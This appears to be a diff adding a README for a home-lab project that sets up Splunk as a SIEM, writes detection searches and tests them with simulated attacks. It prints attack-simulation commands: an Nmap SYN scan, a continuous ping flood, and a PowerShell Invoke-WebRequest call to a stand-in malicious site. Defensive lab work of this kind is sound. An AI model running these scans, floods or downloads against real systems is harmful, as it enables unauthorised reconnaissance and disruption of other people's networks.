@@ -1,0 +1,105 @@
+# SIEM Setup and Malicious Activity Simulation with Splunk
+
+## Project Overview
+This project involves setting up Splunk as a SIEM (Security Information and Event Management) platform to monitor and detect malicious activities on a home network. Simulated attacks such as Brute Force attempts, Nmap Port Scans, PowerShell command execution, and Ping Flood (DDoS) were used to test custom detection rules created in Splunk.
+
+## Objectives
+- Set up Splunk as a SIEM platform.
+- Collect and ingest logs from various sources, including Windows Event Logs and network traffic.
+- Create custom detection rules in Splunk to identify specific malicious behaviors.
+- Simulate cyber-attacks and analyze detection results.
+
+## Tools Used
+- **Splunk**: For log collection, analysis, and alerting.
+- **Nmap**: To perform network reconnaissance through port scanning.
+- **PowerShell**: To execute potentially malicious commands for testing.
+- **Ping**: To generate high ICMP traffic to simulate a DDoS attack.
+- **Wireshark/Tcpdump**: For capturing network packets.
+
+## Project Steps
+
+### 1. SIEM Platform Setup
+- Installed Splunk and configured it on the local machine.
+- Added data inputs:
+  - **Windows Event Logs:** Collected system, security, and application logs.
+  - **Syslog:** Configured to collect logs from network devices.
+
+### 2. Data Collection
+- Logs from Windows Event Log, syslog, and captured network traffic were ingested into Splunk.
+- Verified that data was successfully indexed and available for search.
+
+### 3. Custom Detection Rules
+Created detection rules to identify the following activities:
+
+#### **Rule 1: Brute Force Login Detection**
+- **Purpose:** Detect multiple failed login attempts to identify brute force attacks.
+- **Search Query:**
+  index=main source="WinEventLog:Security" EventCode=4625
+  | stats count by Account_Name, ComputerName
+  | where count > 5
+
+    Description: This rule triggers an alert if there are more than 5 failed login attempts from the same account.
+
+Rule 2: Nmap Port Scan Detection
+    Purpose: Identify port scanning activities conducted by Nmap.
+    Search Query:
+    index=* sourcetype=*network* OR sourcetype=*firewall* OR sourcetype=*syslog*
+    | search "Nmap" OR "port scan" OR "SYN scan" OR "connection attempt"
+    Description: Searches for common terms associated with Nmap scans to detect suspicious scanning behavior.
+
+Rule 3: Malicious PowerShell Command Execution
+    Purpose: Detect potentially harmful PowerShell commands.
+    Search Query:
+    index=main sourcetype="WinEventLog:Security" EventCode=4104
+    | search "Invoke-WebRequest"
+    Description: Detects commands like Invoke-WebRequest often used for downloading malicious payloads.
+
+Rule 4: High ICMP Traffic (Ping Flood) Detection
+
+    Purpose: Detect high levels of ICMP traffic indicative of a DDoS attack.
+    Search Query:
+    index=* sourcetype=*network*
+    | stats count by src_ip
+    | where count > 100
+    Description: Monitors for unusually high ICMP packet counts from a single IP source.
+
+4. Malicious Activity Simulation
+
+Executed the following commands to simulate malicious activities:
+A. Brute Force Login Simulation
+    Steps:
+        Repeatedly entered incorrect passwords on the Windows login screen to generate failed login attempts.
+
+B. Nmap Port Scan Simulation
+
+    Command:
+    nmap -sS -p 1-1000 <target_IP>
+    Description: Conducted a SYN scan on the target IP address to simulate reconnaissance.
+
+C. Malicious PowerShell Command Execution
+
+    Command:
+    Invoke-WebRequest -Uri http://example-malicious-site.com
+    Description: Simulated a command that downloads data from an external URL.
+
+D. Ping Flood Simulation
+
+    Command:
+    ping -t <target_IP>
+    Description: Sent continuous ping requests to generate high ICMP traffic.
+
+5. Analysis and Results
+
+    Verified that all simulated activities were detected by the custom Splunk alerts.
+    Adjusted detection rules based on the results to optimize accuracy.
+
+Results
+
+    Splunk successfully detected the simulated attacks using the custom rules and alerts.
+    The setup and detection process provided valuable insights into the effectiveness of Splunk as a SIEM tool in a home network environment.
+
+Future Improvements
+
+    Enhance Detection Rules: Continue refining the detection rules to catch more sophisticated attack patterns.
+    Integrate Additional Data Sources: Expand the setup to include IDS/IPS logs and other network monitoring tools.
+    Automate Response Actions: Implement automated responses for certain detected activities to improve the security posture.
